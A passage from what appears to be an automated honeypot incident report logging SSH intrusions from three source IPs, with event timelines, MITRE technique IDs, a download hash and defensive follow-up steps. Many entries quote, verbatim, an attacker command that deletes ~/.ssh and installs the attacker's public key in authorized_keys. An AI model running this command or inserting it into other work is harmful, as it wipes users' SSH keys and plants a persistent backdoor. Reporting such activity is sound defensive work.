| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:09:51` | `cowrie.session.connect` |
| `2026-04-29 12:09:51` | `cowrie.client.version` |
| `2026-04-29 12:09:51` | `cowrie.client.kex` |
| `2026-04-29 12:09:52` | `cowrie.login.success` |
| `2026-04-29 12:09:52` | `cowrie.session.params` |
| `2026-04-29 12:09:52` | `cowrie.command.input` |
| `2026-04-29 12:09:52` | `cowrie.command.failed` |
| `2026-04-29 12:09:52` | `cowrie.log.closed` |
| `2026-04-29 12:09:53` | `cowrie.session.params` |
| `2026-04-29 12:09:53` | `cowrie.command.input` |
| `2026-04-29 12:09:53` | `cowrie.session.file_download` |
| `2026-04-29 12:09:53` | `cowrie.log.closed` |
| `2026-04-29 12:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9491ecb71645

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:09 |
| **Last Seen** | 2026-04-29 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:09:55` | `cowrie.session.connect` |
| `2026-04-29 12:09:55` | `cowrie.client.version` |
| `2026-04-29 12:09:55` | `cowrie.client.kex` |
| `2026-04-29 12:09:56` | `cowrie.login.success` |
| `2026-04-29 12:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9861fa3b97b9

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:11 |
| **Last Seen** | 2026-04-29 12:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:11:37` | `cowrie.session.connect` |
| `2026-04-29 12:11:37` | `cowrie.client.version` |
| `2026-04-29 12:11:37` | `cowrie.client.kex` |
| `2026-04-29 12:11:38` | `cowrie.login.success` |
| `2026-04-29 12:11:38` | `cowrie.session.params` |
| `2026-04-29 12:11:38` | `cowrie.command.input` |
| `2026-04-29 12:11:38` | `cowrie.command.failed` |
| `2026-04-29 12:11:38` | `cowrie.log.closed` |
| `2026-04-29 12:11:39` | `cowrie.session.params` |
| `2026-04-29 12:11:39` | `cowrie.command.input` |
| `2026-04-29 12:11:39` | `cowrie.session.file_download` |
| `2026-04-29 12:11:39` | `cowrie.log.closed` |
| `2026-04-29 12:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25653b14f02a

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:11 |
| **Last Seen** | 2026-04-29 12:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:11:41` | `cowrie.session.connect` |
| `2026-04-29 12:11:41` | `cowrie.client.version` |
| `2026-04-29 12:11:41` | `cowrie.client.kex` |
| `2026-04-29 12:11:42` | `cowrie.login.success` |
| `2026-04-29 12:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4197e61e38a

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:19 |
| **Last Seen** | 2026-04-29 12:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:19:34` | `cowrie.session.connect` |
| `2026-04-29 12:19:34` | `cowrie.client.version` |
| `2026-04-29 12:19:34` | `cowrie.client.kex` |
| `2026-04-29 12:19:35` | `cowrie.login.success` |
| `2026-04-29 12:19:36` | `cowrie.session.params` |
| `2026-04-29 12:19:36` | `cowrie.command.input` |
| `2026-04-29 12:19:36` | `cowrie.command.failed` |
| `2026-04-29 12:19:37` | `cowrie.log.closed` |
| `2026-04-29 12:19:37` | `cowrie.session.params` |
| `2026-04-29 12:19:37` | `cowrie.command.input` |
| `2026-04-29 12:19:38` | `cowrie.session.file_download` |
| `2026-04-29 12:19:38` | `cowrie.log.closed` |
| `2026-04-29 12:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05b8740375ae

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:19 |
| **Last Seen** | 2026-04-29 12:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:19:41` | `cowrie.session.connect` |
| `2026-04-29 12:19:41` | `cowrie.client.version` |
| `2026-04-29 12:19:41` | `cowrie.client.kex` |
| `2026-04-29 12:19:43` | `cowrie.login.success` |
| `2026-04-29 12:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05431eb49e3d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:23 |
| **Last Seen** | 2026-04-29 12:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:23:25` | `cowrie.session.connect` |
| `2026-04-29 12:23:25` | `cowrie.client.version` |
| `2026-04-29 12:23:25` | `cowrie.client.kex` |
| `2026-04-29 12:23:25` | `cowrie.login.success` |
| `2026-04-29 12:23:26` | `cowrie.session.params` |
| `2026-04-29 12:23:26` | `cowrie.command.input` |
| `2026-04-29 12:23:26` | `cowrie.command.failed` |
| `2026-04-29 12:23:26` | `cowrie.log.closed` |
| `2026-04-29 12:23:26` | `cowrie.session.params` |
| `2026-04-29 12:23:26` | `cowrie.command.input` |
| `2026-04-29 12:23:26` | `cowrie.session.file_download` |
| `2026-04-29 12:23:26` | `cowrie.log.closed` |
| `2026-04-29 12:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab9f3e7f529

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:23 |
| **Last Seen** | 2026-04-29 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:23:29` | `cowrie.session.connect` |
| `2026-04-29 12:23:29` | `cowrie.client.version` |
| `2026-04-29 12:23:29` | `cowrie.client.kex` |
| `2026-04-29 12:23:29` | `cowrie.login.success` |
| `2026-04-29 12:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39dedddc0dd7

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:27 |
| **Last Seen** | 2026-04-29 12:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:27:49` | `cowrie.session.connect` |
| `2026-04-29 12:27:49` | `cowrie.client.version` |
| `2026-04-29 12:27:49` | `cowrie.client.kex` |
| `2026-04-29 12:27:51` | `cowrie.login.success` |
| `2026-04-29 12:27:51` | `cowrie.session.params` |
| `2026-04-29 12:27:51` | `cowrie.command.input` |
| `2026-04-29 12:27:51` | `cowrie.command.failed` |
| `2026-04-29 12:27:52` | `cowrie.log.closed` |
| `2026-04-29 12:27:52` | `cowrie.session.params` |
| `2026-04-29 12:27:52` | `cowrie.command.input` |
| `2026-04-29 12:27:53` | `cowrie.session.file_download` |
| `2026-04-29 12:27:53` | `cowrie.log.closed` |
| `2026-04-29 12:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d61e8151a620

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:27 |
| **Last Seen** | 2026-04-29 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:27:56` | `cowrie.session.connect` |
| `2026-04-29 12:27:56` | `cowrie.client.version` |
| `2026-04-29 12:27:57` | `cowrie.client.kex` |
| `2026-04-29 12:27:58` | `cowrie.login.success` |
| `2026-04-29 12:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3410839d66

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:31 |
| **Last Seen** | 2026-04-29 12:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:31:33` | `cowrie.session.connect` |
| `2026-04-29 12:31:33` | `cowrie.client.version` |
| `2026-04-29 12:31:33` | `cowrie.client.kex` |
| `2026-04-29 12:31:34` | `cowrie.login.success` |
| `2026-04-29 12:31:34` | `cowrie.session.params` |
| `2026-04-29 12:31:34` | `cowrie.command.input` |
| `2026-04-29 12:31:34` | `cowrie.command.failed` |
| `2026-04-29 12:31:34` | `cowrie.log.closed` |
| `2026-04-29 12:31:35` | `cowrie.session.params` |
| `2026-04-29 12:31:35` | `cowrie.command.input` |
| `2026-04-29 12:31:35` | `cowrie.session.file_download` |
| `2026-04-29 12:31:35` | `cowrie.log.closed` |
| `2026-04-29 12:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1709630dc42a

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:31 |
| **Last Seen** | 2026-04-29 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:31:37` | `cowrie.session.connect` |
| `2026-04-29 12:31:37` | `cowrie.client.version` |
| `2026-04-29 12:31:37` | `cowrie.client.kex` |
| `2026-04-29 12:31:38` | `cowrie.login.success` |
| `2026-04-29 12:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b429c143383e

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:33 |
| **Last Seen** | 2026-04-29 12:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:33:08` | `cowrie.session.connect` |
| `2026-04-29 12:33:08` | `cowrie.client.version` |
| `2026-04-29 12:33:08` | `cowrie.client.kex` |
| `2026-04-29 12:33:10` | `cowrie.login.success` |
| `2026-04-29 12:33:10` | `cowrie.session.params` |
| `2026-04-29 12:33:10` | `cowrie.command.input` |
| `2026-04-29 12:33:10` | `cowrie.command.failed` |
| `2026-04-29 12:33:11` | `cowrie.log.closed` |
| `2026-04-29 12:33:11` | `cowrie.session.params` |
| `2026-04-29 12:33:11` | `cowrie.command.input` |
| `2026-04-29 12:33:12` | `cowrie.session.file_download` |
| `2026-04-29 12:33:12` | `cowrie.log.closed` |
| `2026-04-29 12:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0333cb9d57

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:33 |
| **Last Seen** | 2026-04-29 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:33:15` | `cowrie.session.connect` |
| `2026-04-29 12:33:15` | `cowrie.client.version` |
| `2026-04-29 12:33:16` | `cowrie.client.kex` |
| `2026-04-29 12:33:17` | `cowrie.login.success` |
| `2026-04-29 12:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16d6258d76a2

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:34 |
| **Last Seen** | 2026-04-29 12:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:34:10` | `cowrie.session.connect` |
| `2026-04-29 12:34:10` | `cowrie.client.version` |
| `2026-04-29 12:34:10` | `cowrie.client.kex` |
| `2026-04-29 12:34:11` | `cowrie.login.success` |
| `2026-04-29 12:34:12` | `cowrie.session.params` |
| `2026-04-29 12:34:12` | `cowrie.command.input` |
| `2026-04-29 12:34:12` | `cowrie.command.failed` |
| `2026-04-29 12:34:13` | `cowrie.log.closed` |
| `2026-04-29 12:34:13` | `cowrie.session.params` |
| `2026-04-29 12:34:13` | `cowrie.command.input` |
| `2026-04-29 12:34:14` | `cowrie.session.file_download` |
| `2026-04-29 12:34:14` | `cowrie.log.closed` |
| `2026-04-29 12:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73191789a84e

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-29 12:34 |
| **Last Seen** | 2026-04-29 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:34:17` | `cowrie.session.connect` |
| `2026-04-29 12:34:17` | `cowrie.client.version` |
| `2026-04-29 12:34:17` | `cowrie.client.kex` |
| `2026-04-29 12:34:19` | `cowrie.login.success` |
| `2026-04-29 12:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691df5b7f510

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:36 |
| **Last Seen** | 2026-04-29 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:36:59` | `cowrie.session.connect` |
| `2026-04-29 12:36:59` | `cowrie.client.version` |
| `2026-04-29 12:36:59` | `cowrie.client.kex` |
| `2026-04-29 12:36:59` | `cowrie.login.success` |
| `2026-04-29 12:37:00` | `cowrie.session.params` |
| `2026-04-29 12:37:00` | `cowrie.command.input` |
